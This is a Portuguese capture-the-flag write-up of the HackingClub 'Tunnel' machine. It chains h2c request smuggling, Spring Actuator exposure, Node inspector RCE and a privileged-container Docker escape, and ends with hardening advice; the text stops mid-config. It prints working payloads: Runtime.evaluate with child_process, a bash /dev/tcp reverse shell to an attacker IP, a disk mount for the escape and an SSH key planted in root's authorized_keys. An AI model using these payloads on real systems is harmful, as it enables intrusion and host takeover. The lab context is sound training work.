---
title: Tunnel - Desafio Hacker [HackingClub]
description: 'Resolvendo máquina nível médio da Hacking Club sobre h2c request smuggling, RCE e Docker escape'
author: matheus
tags: ["hackingclub", "WriteUps", "RCE", "request smuggling", "docker escape"]
categories: ["SecLab", "Hacking"]
pin: false
comments: true

---

# 📝 Writeup: Tunnel (HackingClub Machine)

### HTTP/2 Cleartext Tunnel (h2c), Nginx Bypass, Node Inspector RCE e Docker Escape

Eu fiz esse desafio em meu ambiente de trabalho com Windows 11 via WSL. Utilizei tanto o terminal do windows - com meu kali sem interface gráfica -, como também abusei do WSL2 que me permite utilizar o Kali com interface gráfica via container. Em outras palavras, tudo foi realizado dentro de um ambiente já configurado e com ferramentas complementares instaladas. Se faz necessário já ter conhecimento prévio em determinadas coisas como Linux/Bash, Redes - como protocolo HTTP -, Fuzzing, Docker, JAVA e JavaScript para resolver esta máquina.

## 1. Enumeração Inicial e Fuzzing

### 1.1 Scan de portas

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/47dffbac-2eea-4c65-b6b7-f51d8582842b" />

```bash
nmap -sV 172.16.3.113
```
<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/3f824288-3cf3-486d-b3c8-f9a9ce516e10" />

```bash
rustscan -a 172.16.3.113
```

**Resultado da enumeração:**
Identificando duas portas abertas:

- Porta 22 (SSH)
- **Porta 8000 (HTTP)** ← Foco principal da análise

### 1.2 Fuzzing inicial

```bash
ffuf -c -u http://172.16.3.113:8000/FUZZ \
     -w ~/SecLists/Discovery/Web-Content/raft-large-words.txt -t 150
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/bcbd33eb-7cc2-4fab-8487-f15b40896f62" />

**Descobertas importantes:**

```text
/error      → Whitelabel Error Page
/actuator   → 403 Forbidden
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/c0539110-3f00-4079-82d6-18a82da77a50" />

**Análise técnica:**
A presença de "*Whitelabel Error Page*" e o diretório "*actuator*" indica **Spring Boot Framework**. Esta identificação nos permite usar wordlists específicas para enumerar endpoints do Spring Boot Actuator.

## 2. Enumeração específica para Spring Boot

### 2.1 Wordlist especializada

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/a953fe73-eb8f-4604-88cd-0c11afac6b24" />

```bash
ffuf -c -u http://172.16.3.113:8000/FUZZ \
     -w /home/matheus/SecLists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t 150
```

**Resultados obtidos:**

- Diversos endpoints do Spring Boot encontrados (`/actuator/env`, `/actuator/heapdump`, etc.)
- **Todos retornando 403 Forbidden** → Filtrados pelo **Nginx reverse proxy**

**Conclusão da enumeração:**

✅ Backend expõe endpoints sensíveis  
❌ Nginx bloqueia requisições externas

## 3. Indicativo de HTTP/2 Tunnel / h2c

A descrição da máquina menciona **"HTTP/2 tunneling"**, indicando vulnerabilidade de **Request Smuggling** via HTTP/2 Cleartext (h2c).

## 4. HTTP/2 Cleartext Upgrade Bypass - h2c Smuggling

### 4.1 Conceitos fundamentais

**HTTP/2 Cleartext (h2c)** é uma extensão do protocolo HTTP/2 que permite comunicação sem TLS/SSL, utilizando o mecanismo de upgrade HTTP/1.1 definido na **RFC 7540**.

**Request Smuggling** é uma técnica que explora diferenças na interpretação de requisições HTTP entre proxies/load balancers e servidores backend, permitindo bypass de controles de segurança.

### 4.2 Cenário da vulnerabilidade

```text
cliente → nginx (HTTP/1.1 proxy) → backend (Spring Boot + h2c support)
```

### 4.3 Como o bypass funciona tecnicamente

1. **Cliente envia requisição de upgrade:**

   ```http
   GET / HTTP/1.1
   Host: target.com
   Connection: Upgrade, HTTP2-Settings
   Upgrade: h2c
   HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
   ```

2. **Nginx processa e repassa** a requisição porque:
   - Não valida adequadamente headers de upgrade H2C
   - Confia que o backend rejeitará upgrades inválidos  
   - Implementação de proxy não considera implicações de segurança do upgrade

3. **Backend (Spring Boot) responde com upgrade bem-sucedido:**

   ```http
   HTTP/1.1 101 Switching Protocols
   Connection: Upgrade
   Upgrade: h2c
   ```

4. **Nginx estabelece túnel TCP transparente** entre cliente e backend

5. **Tráfego subsequente bypassa completamente as ACLs do Nginx** pois:
   - Comunicação agora é HTTP/2 binário
   - Nginx não consegue mais inspecionar/filtrar requisições
   - Todas as regras de proxy_pass são ignoradas

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/1ab35a7c-a8c2-4924-a00b-7fc576e06535" />

### 4.4 Implicações de segurança do bypass

Isso permite acessar endpoints críticos do **Spring Boot Actuator** que estavam protegidos:

- **`/actuator/env`** - Exposição de variáveis de ambiente (credenciais, flags, configurações)
- **`/actuator/heapdump`** - Dump completo da memória heap da JVM  
- **`/actuator/threaddump`** - Estado atual de todas as threads
- **`/actuator/configprops`** - Propriedades de configuração da aplicação

**Riscos críticos do /heapdump:**

- Contém **toda a memória ativa** da aplicação Java
- Pode expor **senhas em texto claro**, tokens de sessão, dados de usuários
- Histórico de todas as requisições HTTP processadas  
- Strings de conexão com banco de dados
- Chaves criptográficas em memória

**Por que o Actuator é crítico:**
O Spring Boot Actuator fornece endpoints de monitoramento e gestão que **nunca deveriam ser expostos publicamente**. São destinados apenas para administração interna e debugging.

Recomendo a leitura da publicação [Analisando o heapdump do Spring Boot Actuator](https://blog.crowsec.com.br/conhecendo-o-heapdump/) do blog da Crowsec

## 5. Exploração com h2csmuggler

Documentação recomendada: [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)](https://bishopfox.com/blog/h2c-smuggling-request)

### 5.1 Instalação e configuração

```bash
# Instalação da ferramenta python [github]
# clone do repositório feito para /home/matheus/tools/h2csmuggler 
cd tools #entrando na minha pasta tools dentro da home | se não tiver essa pasta crie com o "mkdir tools"
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2
#pip3 install h2 --break-system-packages
#pip3 install -r requirements.txt -> caso tenha o arquivo (nesse caso n precisa ter, apenas fzr com 'h2' direto)
python3 ./h2csmuggler.py -h

# Configurando alias para execução global
nano ~/.bashrc
# Adicionar no final do arquivo:
alias h2csmuggler='python3 ~/tools/h2csmuggler/h2csmuggler.py'
# Aplicando atalho
source ~/.bashrc
```

### 5.2 Testando vulnerabilidade

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/5cab71a2-5ca7-4906-8373-effa398878f3" />

```bash
h2csmuggler -x http://172.16.3.113:8000 --test
```

**Resultado:**

```text
[INFO] Success http://172.16.3.113:8000/ can be used for tunneling
```

### 5.3 Acessando endpoint bloqueado

```bash
h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator
```

**Resultado:**

- Acesso ao conteúdo JSON do Actuator ✅
- **Bypass confirmado** ✅

### 5.4 Explorando variáveis de ambiente

```bash
h2csmuggler -x http://172.16.3.113:8000 http://backend/actuator/env
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/dd25fd9f-4122-4d15-9d60-81496f98a51a" />

Se formos ao final do arquivo poderemos identificar o JSON que esperamos do /env

## 6. Informações sensíveis encontradas no /actuator/env

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/aba4d6c3-4061-4527-8219-5b175216c2c8" />

Ao analisar o JSON retornado do `/env` (utilizando um formatter para melhor legibilidade), identificamos

**🚩 A PRIMEIRA FLAG ENCONTRADA:**

```text
hackingclub{c71b3ebb3e25f3c8304d90***************309a3f}
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/c05b08ba-cc27-4adc-9fb2-f205fe80af69" />

 - Não se acostume com a flag estando visível na imagem acima, a próxima você terá que botar a mão na massa para achar!

### 6.1 Endpoints importantes descobertos

Juntando o que encontramos anteriormente com esse json podemos identificar/mapear importantes pontos para exploração

<img width="800" height="699" alt="image" src="https://github.com/user-attachments/assets/94b837cd-1b99-446c-bc3b-e3995206f6b8" />

**Endpoints mapeados:**

- `/actuator/env`
- `/actuator/heapdump`  
- `NODE_DEBUG_HOST`
- `NODE_DEBUG_PATH`
- Rotas administrativas internas

**🔍 Endpoint crítico descoberto:**

```text
/admin/internal-web-socket-endpoint
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/6d4ff368-01bd-44a9-a930-c6800edf0530" />

### 6.2 Chrome DevTools Protocol (CDP) - Contexto técnico

O endpoint descoberto expõe o **Chrome DevTools Protocol**, um protocolo de debugging baseado em WebSocket usado por:

- Chrome DevTools
- Node.js Inspector  
- Puppeteer
- Ferramentas de automação de browser

**Como funciona:**

- Comunicação via WebSocket usando mensagens JSON
- Permite controle total sobre o runtime JavaScript
- Acesso a APIs de sistema através do contexto Node.js
- Originalmente projetado para debugging, mas pode ser abusado para RCE

**Domínios críticos do CDP:**

- **Runtime** - Execução de código JavaScript arbitrário
- **Debugger** - Controle de breakpoints e execução
- **Profiler** - Análise de performance  
- **Console** - Interação com console JavaScript

**⚠️ Implicação de segurança:**
CDP **nunca deve ser exposto publicamente** pois permite execução de código arbitrário com os privilégios do processo Node.js.

## 7. Explorando o modo debug do Node.js

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/804f407a-ad91-45d9-a59d-ebfaf4d86ed5" />

### 7.1 Primeiro teste HTTP normal

Utilizando o Postman, com proxy já configurada para testar, vamos selecionar não apenas a opção WebSocket como também HTTP :

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/ab46653e-c951-49eb-af92-f829429a53a3" />

```bash
GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/
```

**Retorno (mesmo de browser):**

```text
WebSocket request was expected
```

**Análise:**

✅ Endpoint válido  
❌ HTTP não aceito — requer WebSocket

### 7.2 Tentando conexão WebSocket

**Testando WebSocket:**

```text
ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/
```

**Resultado:**

```text
Unexpected server response: 400
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/d1646138-3ed5-4d08-812d-a6fa3a577c14" />

**Conclusão:** Não é o WebSocket principal, falta descobrir o caminho correto.

## 8. Descobrindo WebSocket real via DevTools API

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://opengraph.githubassets.com/c539d7ae204980d72d2ab4a76bba47985d3c60faa939bf12f27b1a09388d1fff/ChromeDevTools/devtools-protocol" />

### 8.1 Como funciona o Node.js Inspector

O Node.js Inspector expõe uma API HTTP para discovery de sessões de debugging ativas:

**Endpoints padrão do Inspector:**

- `/json` ou `/json/list` - Lista sessões de debugging
- `/json/version` - Versão do protocolo  
- `/json/activate/<id>` - Ativa uma sessão
- `/ws/<id>` - WebSocket endpoint para debugging

### 8.2 Discovery da sessão ativa

Testando endpoint de discovery:

```bash
GET http://172.16.3.113:8000/admin/internal-web-socket-endpoint/json/list
```

**Resultado:**
JSON contendo informações da sessão de debugging:

```json
{
  "id": "7efa5220-45c7-44c2-b367-d9068de778bd",
  "title": "/app/server.js",
  "type": "node",
  "url": "file://app/server.js",  
  "webSocketDebuggerUrl": "ws://172.16.3.113/7efa5220-45c7-44c2-b367-d9068de778bd"
}
```
<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/d47d4b67-07eb-4888-acef-3f69381a0b8a" />

**Análise importante:**
A URL do WebSocket debug usa a URL com ID. Como estamos acessando via `/admin/internal-web-socket-endpoint/` como "raiz" do debug, devemos testar:

```text
ws://172.16.3.113:8000/admin/internal-web-socket-endpoint/7efa5220-45c7-44c2-b367-d9068de778bd
```

**✅ Conexão WebSocket aceita com sucesso no Postman.**

## 9. Obtendo RCE via Chrome DevTools Protocol

### 9.1 Testando estrutura da mensagem CDP

**Primeira tentativa:**

```json
{}
```

<img width="800" alt="image" style="display: block; margin: 0 auto;" src="https://github.com/user-attachments/assets/cd232c50-857d-4829-98e9-13b4f6232048" />

**Erros obtidos:**

- Falta campo obrigatório `id` (integer)
- Falta campo obrigatório `method` (string)

### 9.2 Estrutura correta do Chrome DevTools Protocol

Consultando a [documentação oficial](https://chromedevtools.github.io/devtools-protocol/), a ESTRUTURA correta é:

```json
{
  "id": 1,
  "method": "Domain.methodName",
  "params": {
    "parameterName": "value"
  }
}
```

Conseguimos descobrir que é necessário na estrutura o "params", assim sendo, teremos que identificar não apenas um método como algum parâmetro para o mesmo, então devemos voltar para a documentação oficial, pesquisar e identificá-los.

**Método aparentemente crítico para RCE identificado:**
**`Runtime.evaluate`** indica permitir execução de JavaScript arbitrário.

### 9.3 Descobrindo parâmetros obrigatórios

Consultando [Runtime.evaluate](https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate):

**Parâmetro obrigatório:** `expression` (string)

### 9.4 Testando execução de código

**Payload de teste:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "7*7;"
  }
}
```

**Resultado:**

```json
{
  "result": {
    "type": "number",
    "value": 49,
    "description": "49"
  }
}
```

✅ **Execução de JavaScript confirmada**  
✅ **RCE já é quase uma realidade, estamos muito próximo dele**

## 10. Payload RCE via child_process - Análise técnica

### 10.1 Como funciona a execução de comandos em Node.js

O Node.js fornece o módulo `child_process` para executar comandos do sistema operacional:

```javascript
const { exec, execSync } = require('child_process');

// Assíncrono
exec('whoami', (error, stdout, stderr) => {
  console.log(stdout);
});

// Síncrono  
const result = execSync('whoami').toString();
```

### 10.2 Construindo payload via DevTools Protocol

**Acessando `require` através do contexto global:**

```javascript
// Usando process.mainModule
process.mainModule.require('child_process')
```

**Resumindo payload:**

Ao chamarmos o processo/módulo principal `process.mainModule` teremos acesso ao módulo `require` e então incluir `child process` - a biblioteca do JS para execução de comando -, para assim chamar o método `exec` e, obviamente, executar o comando que queremos.

```javascript
process.mainModule.require('child_process').exec('COMANDO_DESEJADO')
```

A execução não pode quebrar o JSON e, portanto, precisamos colocar o comando escapando aspas. Vamos aproveitar e atualizar nosso payload com sincronização e string de saída.

**Por que trocar para execSync:**

- Execução síncrona = resposta imediata
- `.toString()` converte Buffer para string  
- Mais fácil de debuggar via CDP

### 10.3 Construção da payload final

**Adaptando payload - Escapando caracteres para JSON:**

```javascript
// Temos: process.mainModule.require('child_process').exec("");
//
// O comando que queremos executar inicialmente para identificação: id
//
// Modernizando
//  * process.require('child_process').exec("id");
// Adaptando
//  * process.require('child_process').execSync(\"id\").toString();
//
// Payload:
// process.require('child_process').execSync(\"id\").toString();
// É necessário mainModule
process.mainModule.require('child_process').execSync(\"id\").toString();
```

→ Trocaremos o .exec para .execSync, pois assim poderemos ver o output na hora, como falamos anteriormente;

→ Podemos adicionar o toString para colocar o output do comando em string;

→ Precisaremos evitar que o JSON não quebre escapando aspas *(\ " \ ")*;

**Payload completa:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "process.mainModule.require('child_process').execSync(\"id\").toString();"
  }
}
```

**Resultado:**

```text
uid=0(root) gid=0(root) groups=0(root)
```

🔥 **RCE como root dentro do container Node.js**

Agora basta apenas executarmos via bash nossa shell reversa para acessar a máquina

## 11. Estabelecendo Reverse Shell

### 11.1 Conceito técnico

Reverse shell inverte a direção típica de conexão:

- **Shell normal:** Cliente conecta ao servidor
- **Reverse shell:** Servidor conecta de volta ao cliente

**Vantagens:**

- Bypassa firewalls que bloqueiam conexões de entrada
- Funciona através de NAT/proxy  
- Mais difícil de detectar

### 11.2 Implementação

**Listener na máquina atacante:**

```bash
nc -lvnp 8000
```

**Payload via DevTools Protocol:**

```json
{
  "id": 1,
  "method": "Runtime.evaluate", 
  "params": {
    "expression": "process.mainModule.require('child_process').execSync(\"/bin/bash -c 'bash -i >& /dev/tcp/10.0.30.175/8000 0>&1'\")"
  }
}
```

**Explicação da payload bash:**

- `bash -i` = Shell interativo
- `>&` = Redireciona stdout e stderr
- `/dev/tcp/IP/PORT` = Pseudo-device do bash para TCP  
- `0>&1` = Redireciona stdin também

✅ **Resultado: Shell reversa obtida como root no container**

## 12. Identificando container e melhorando TTY

### 12.1 Análise do ambiente

Explorando o ambiente obtido:

```bash
ls -la
```

**Indicadores de container Docker:**

- Hostname com ID randômico
- Presença do arquivo `/.dockerenv`

**Conclusão:** Estamos como root dentro de um container Docker, não na máquina principal. Necessário Docker Escape para a flag final.

### 12.2 Melhorando interação da shell (NÃO É NECESSÁRIO)

```bash
cd /root
ls -la  
which script  # ✅ Disponível
```

**Upgrade de TTY:**

```bash
script /dev/null -c bash
export TERM=xterm  
stty raw -echo && fg
```

### 12.3 Análise da topologia de rede

```bash
hostname -I  # IP interno do container
```

**Resultado:** `172.18.0.3`

**INTERPRETAÇÃO da rede Docker:**

- Range `172.18.0.0/16` = Rede bridge customizada
- `172.18.0.1` = Gateway (provavelmente o host)  
- `172.18.0.2` = Nossa máquina principal
- `172.18.0.3` = Nosso container atual
- Possíveis outros containers na mesma rede

**Opções de lateral movement:**

- **Network scanning** - `nmap 172.18.0.0/24`
- **Service discovery** - Procurar outros serviços internos
- **Docker escape** - Foco principal para acessar o host

### 12.4 Automatizando Docker security assessment

**deepce.sh** é uma ferramenta especializada em:

- Enumerar capabilities do container  
- Detectar possíveis vetores de escape
- Identificar configurações inseguras
- Testar permissões de arquivo/dispositivo

**Transferindo a ferramenta:**

**Na máquina atacante:**

```bash
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh #ou ir na pasta do seu deepce.sh
python3 -m http.server 8000 #abrir server para transferir o arquivo para o container
```

**No container alvo:**

```bash
wget 10.0.30.175:8000/deepce.sh #colocar seu IP externo de maquina
chmod +x deepce.sh #permissão ao script
./deepce.sh #executar script - vai acabar n sendo necessário utilizar ele nesse caso
```

### 12.5 Docker Capabilities e Containers Privilegiados

**Linux Capabilities** são um sistema de controle granular que divide os privilégios de root em unidades menores e específicas:

**Container normal:** Capabilities limitadas (ex: CAP_CHOWN, CAP_DAC_OVERRIDE)  
**Container privilegiado:** Todas as capabilities + acesso a devices do host

**Principais capabilities para escape:**

- **CAP_SYS_ADMIN** - Permite mount de filesystems
- **CAP_SYS_PTRACE** - Debug de processos do host  
- **CAP_SYS_MODULE** - Carregamento de módulos do kernel
- **CAP_DAC_READ_SEARCH** - Bypass de permissões de leitura

**Verificação sem capsh:**
Sem a ferramenta `capsh`, testamos capabilities indiretamente:

- Tentativa de mount → testa CAP_SYS_ADMIN
- Acesso a `/proc/1/` → testa visualização de processos do host  
- Listagem de `/dev/` → verifica acesso a devices

**Análise de partições:**

```bash
df -h
# fdisk -l não disponível no container
```

A partição de maior tamanho será nosso alvo para mount.

## 13. Docker Escape — Explorando Container Privilegiado

### 13.1 Técnica: Host Filesystem Mount

Em containers privilegiados, podemos montar partições do sistema host:

```bash
# Listar partições disponíveis
df -h
lsblk  # se disponível

# Tentar montar a partição principal do host  
mount /dev/nvme0n1p1 /mnt
```

**Por que isso funciona:**

- Container privilegiado tem **CAP_SYS_ADMIN**
- Acesso direto aos **device nodes** do host (`/dev/nvme0n1p1`)  
- Capability permite **mount de filesystems arbitrários**

**Resultado:**

✅ Mount bem-sucedido → Container é privilegiado  
✅ `/mnt` agora contém o **filesystem completo do host**  
✅ `/mnt/root` = diretório `/root` do sistema hospedeiro

### 13.2 Alternativas de escape (se mount falhasse)

- **Shared PID namespace** → `nsenter` para processos do host
- **Socket do Docker** → `docker -H unix://var/run/docker.sock run`  
- **Device access** → Escrita direta em `/dev/sda`
- **Kernel modules** → Carregamento de LKM malicioso

### 13.3 Acesso ao host via SSH (método alternativo)

#### Dentro da máquina pessoal:

**Gerando chave SSH:**

```bash
# dentro do meu diretório organizado
ssh-keygen -t rsa -f rsa
cat rsa.pub | base64 -w0 | xclip -sel clip
```

#### Dentro da máquina alvo:

**Copiando chave base64 para authorized_keys do host:**

```bash
#cd .ssh #dentro do /mnt/root -> echo '<base64_da_chave_publica_shift_ctrl_c>' | base64 -d > authorized_keys
echo 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FENURmbGVNTStESmNiTUxUSFZRd3lQT2lrYmI0QjV4eUFNb1JPZmdUKzIwWWtJSmxpcE91M25jTTB1N2tJb2ZZTE1NUTY2ZzIycFVkZHNxWXNXclZyUnNGSjZEVEFVT0lubVlESHdjMlVZM0ZzWWdFUjBsV0RaTlJ5b2lTS3hNS2hLTW42VWxWc21GVGx2MDBDNGFrQml1MnlvQytVb2hWaDlYTDdsNFd2eE5EWk05TDF3b0wxdWtRZGUyMDUxd2lWakVKc1kvNXFoUGJzUUM1V2o5YmttNmdYcS96YVExdEQzVW9HbVZtMjhnN1dNMk1BNFVaWGVxOGw4Qnh2YVV5bFZDdU9nZW9NNW5lUlFFUUxiOERGWVdDZmVBYWF0SFBPaDdmTGZnQThkRUxHbS82VUFKSGtjSmJrdzdkMUdHeFRlQlZ1UENvM3FGVzFNbDVvVW1UZUVUNUduaVkwUzJQazlSYjZmblEyQnBUQXpOYmg0R2JFNVN2Ykt4Wjl5ZFFNdnlETUpicDNjYldLekhVdFFLQ0RTNEFJZGI0TW95ZUpzeUE3T1UwL2xkV2M3OCt2UFVoK1daZlIyRnFSSUtMbmdHRUtocDFueHRQRVVmeFpzY3BLSlNGRWEyTE5ZZENCbGtxcHowZDh5ejFvazBEeTdMOFhlUmtHbXhXOHlMQ2M9IG1hdGhldXNAbGFpZGxlcgo=' | base64 -d >> /mnt/root/.ssh/authorized_keys
```

**Acesso SSH direto ao host:**

```bash
matheus@laidler ~/tunnel$ sudo ssh -i rsa root@172.16.3.113
#> yes
#...
root@ip-172-16-3-113# ls -la
#pronto, entramos na máquina host como root direto.
```

✅ **Root no host**  
✅ **Comprometimento total**

## 14. Acesso à flag final

Com acesso completo ao filesystem do host via mount:

```bash
#cd /mnt/root 
ls -la
cat root.txt
```

**🚩 SEGUNDA FLAG ENCONTRADA:**

```text
hackingclub{d349c11e22a06b34d04e58***************6a0d302}
```

## 15. Análise do ambiente pós-exploração

Ao estar logado na máquina host, seja ao acessar a partição montada no container (`/mnt/root`) ou acessando diretamente via SSH, ao listar o diretório veremos a pasta `stack`.

```bash 
ls -la
cd stack
ls
```

### 15.1 Verificando configurações Nginx

Dentro da pasta STACK teremos:
 `Dockerfile.proxy`  `Dockerfile.spring`  `app`  `conf`  `docker-compose.yaml`  `spring`

Ao darmos um `cat Dockerfile.proxy` veremos que `conf/nginx.conf` é copiado para dentro do `/etc/nginx/conf.d/default.conf` do container.

Podemos continuar a explorar diversos destes itens, veremos também o docker-compose.yaml assim como veremos o arquivo de configuração do nginx e verificar se era ele mesmo que estava bloqueando o acesso ao endpoint: :

```bash
cat docker-compose.yaml 
```

```yaml
version: "3"
services:
  backend:
    restart: always
    build:
      context: .
      dockerfile: Dockerfile.spring
    environment:
      - SPRING_PROFILES_ACTIVE=prod
      - FLAG="hackingclub{c71b3ebb3e********************9a3f}"
      - NODE_DEBUG_HOST="http://internal:8000/"
      - NODE_DEBUG_PATH="/admin/internal-web-socket-endpoint"
  proxy:
    restart: always 
    build:
      context: .
      dockerfile: Dockerfile.proxy
    ports:
      - "8000:80"
    depends_on:
      - backend
      - internal
    links:
      - backend
      - internal
  internal:
    restart: always   
    image: node
    user: "root"
    command: "node --inspect=0.0.0.0:8000 /app/server.js"
    volumes:
      - ./app:/app
    privileged: true

```

```bash
cd conf
ls
cat nginx.conf

```
```conf
server {
    listen       80 default_server;
    server_name  localhost;

    location / {
     proxy_pass http://backend:8080;
     proxy_http_version 1.1;
     proxy_set_header Upgrade $http_upgrade;
     proxy_set_header Connection $http_connection;
    }

    location /actuator {
    deny all;
    }

    location /admin/internal-web-socket-endpoint/ {
        proxy_pass http://internal:8000/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $http_connection;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

}

```

 -  - Dockerfile.spring -> springboot -> internal -> NODE_DEBUG_PATH -> http://backend:8080 -> ...

Perceba que:
 - O host backend é o springboot 
 - Todo request que vai paro a raiz "/" então vai para o springboot
 - Possui o header ´Upgrade`, isto é, aceita upgrade de HTTP1.1 para HTTP2
 - Nginx bloqueando com o `Deny all` se o endpoint `/actuator` for acessado
 - A config de acesso ao `admin/internal/web-socket-endpoint/` é internal:8000, que é a aplicacao do node *(container que caimos e pegamos shell)*
 - Falta verificar ainda o arquivo de configuração do Sping, que vai ser necessário saber como a má configuração possibilita o Request Smuggling

### 15.2 Verificando configuração Spring Boot

```bash
 cd spring/spring/
 ls
 cd src/main/resources/
 cat application.yaml
```

**Configuração crítica confirmada:**

```yaml
server:
  http2:
    enabled: true
```

**Análise:** Requisito obrigatório para h2c smuggling (HTTP/2 deve estar habilitado no backend).

### 15.3 Configurações confirmadas:

- Bloqueio explícito de `/actuator`  
- Permissão para header `Upgrade: h2c`
- Proxy para diferentes backends:
  - backend (Spring Boot)
  - internal (Node debugging endpoint)
- Spring Boot configurado com server `http2` enable

## 16. Análise técnica e mitigações

### 16.1 Chain de exploração

1. **Enumeração** → Identificação de Spring Boot + Nginx proxy reverso
2. **h2c Smuggling** → Bypass de ACL através de HTTP/2 Cleartext upgrade  
3. **Actuator exposure** → Descoberta de informações sensíveis e endpoints internos
4. **Chrome DevTools Protocol** → Exploração de WebSocket de debugging Node.js
5. **RCE via CDP** → Execução de JavaScript com child_process  
6. **Container privilegiado** → Docker escape via mount de filesystem
7. **Host compromise** → Acesso root completo ao sistema hospedeiro via SSH

### 16.2 Mitigações recomendadas

#### 16.2.1 HTTP/2 Cleartext (h2c)

- Desabilitar suporte a h2c em produção
- Configurar Nginx para rejeitar headers de upgrade H2C  
- Implementar validação rigorosa de protocolos no proxy

**Exemplo de configuração segura Nginx:**

```nginx
# ────────────────────────────────────────────────
#   DEFESAS BÁSICAS CONTRA H2C / REQUEST SMUGGLING
# ────────────────────────────────────────────────

# Bloqueia tentativas de upgrade para HTTP/2 em texto puro (H2C)
# Isso evita ataques como "H2C smuggling" via reverse proxy.
if ($http_upgrade ~* "h2c") {
    return 400;
}

# Remove headers perigosos para impedir upgrades indevidos
# (previne WebSocket/H2C sendo ativados quando não deveria)
proxy_set_header Upgrade "";
proxy_set_header Connection "";


# ────────────────────────────────────────────────
#   CONFIGURAÇÃO PRINCIPAL DO SERVIDOR
# ────────────────────────────────────────────────
server {
    listen 80 default_server;
    server_name localhost;

    # ────────────────────────────────────────────
    #   / → backend Java
    # ────────────────────────────────────────────
    location / {
        proxy_pass http://backend:8080;
        proxy_http_version 1.1;

        # Permite upgrade somente quando realmente necessário
        # (evita fallback para valores vazios do bloco global)
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $http_connection;
    }

    # ────────────────────────────────────────────
    #   /actuator → proibido externamente
    # ────────────────────────────────────────────
    location /actuator {
        deny all;
    }

    # ────────────────────────────────────────────
    #   WebSocket interno do serviço "internal"
    # ────────────────────────────────────────────
    location /admin/internal-web-socket-endpoint/ {
        proxy_pass http://internal:8000/;
        proxy_http_version 1.1;

        # Upgrades só para WebSocket legítimo
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $http_connection;

        # Headers necessários para WebSockets atrás de proxy
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

```

 - Este código ainda não está 100%, mas já resolve essa situação atual

#### 16.2.2 Spring Boot Actuator

```yaml
management:
  endpoints:
    web:
      exposure:
        include: "health,info"  # Apenas endpoints seguros
  endpoint:
    health:
      show-details: never
  security:
    enabled: true  # Autenticação obrigatória
  server:
    port: 8081  # Porta administrativa SEPARADA
```

#### 16.2.3 Node.js DevTools

```javascript
// Nunca expor debugging em produção
if (process.env.NODE_ENV !== 'production') {
  require('inspector').open(9229, 'localhost', false);
}

// Ou verificação mais rigorosa
if (process.env.DEBUG_MODE === 'true' && process.env.NODE_ENV === 'development') {
  require('inspector').open(9229, '127.0.0.1', false);
}
```

#### 16.2.4 Docker Security

```yaml
# docker-compose.yml
version: "3.8"

services:
  backend:
    restart: always
    build:
      context: .
      dockerfile: Dockerfile.spring

    environment:
      - SPRING_PROFILES_ACTIVE=prod
      - FLAG="hackingclub{c71b3ebb3e25f3c8304d9010a1c3765742309a3f}"
      - NODE_DEBUG_HOST="http://internal:8000/"
      - NODE_DEBUG_PATH="/admin/internal-web-socket-endpoint"

    # ──────────────────────────────
    #  HARDENING / SEGURANÇA
    # ──────────────────────────────

    security_opt:
      - no-new-privileges:true    # Impede que qualquer processo ganhe privilégios extra (mesmo via exploit)

    cap_drop:
      - ALL                        # Remove TODAS capabilities Linux (mitiga contêiner pivot e syscalls perigosas)

    # cap_add: []                  # Não adicionamos nada — backend não deveria precisar de capabilities

    read_only: true                # Filesystem somente leitura → impede webshell escrita, modificação de binários etc.
    user: "1000:1000"              # Roda como usuário NÃO-ROOT → reduz impacto de RCE

    networks:
      - app-network                # Isolamento de rede entre serviços (evita exposição desnecessária)

  proxy:
    restart: always 
    build:
      context: .
      dockerfile: Dockerfile.proxy

    ports:
      - "8000:80"

    depends_on:
      - backend
      - internal

    # ──────────────────────────────
    #  HARDENING / SEGURANÇA (PROXY)
    # ──────────────────────────────

    security_opt:
      - no-new-privileges:true

    cap_drop:
      - ALL

    cap_add:
      - NET_BIND_SERVICE           # ÚNICA capability necessária para rodar na porta 80 sem ser root

    read_only: true
    user: "1000:1000"

    networks:
      - app-network

  internal:
    restart: always
    image: node

    # privileged: true  (FORMATO ORIGINAL) X
